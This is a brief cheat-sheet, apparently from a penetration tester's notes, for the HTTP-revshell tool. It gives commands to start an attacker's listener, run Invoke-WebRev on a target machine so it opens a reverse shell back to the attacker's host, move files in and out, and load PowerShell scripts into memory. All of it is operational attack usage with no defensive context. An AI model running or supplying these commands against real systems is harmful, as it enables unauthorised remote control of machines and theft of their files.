### source
https://github.com/3v4Si0N/HTTP-revshell  

### start listener
```
$> python3 server.py <lhost> <lport> --ssl
```

### start on target machine
```
PS> Invoke-WebRev -ip <lhost> -port <lport> -ssl
```

### upload/download files
```
PS> upload <source/path> <C:\destination\path>
```

### load powershellscript into memory
```
PS> loadps1 <source/path>
```

### for server: you might need to install
```
sudo apt install libncurses5-dev
```

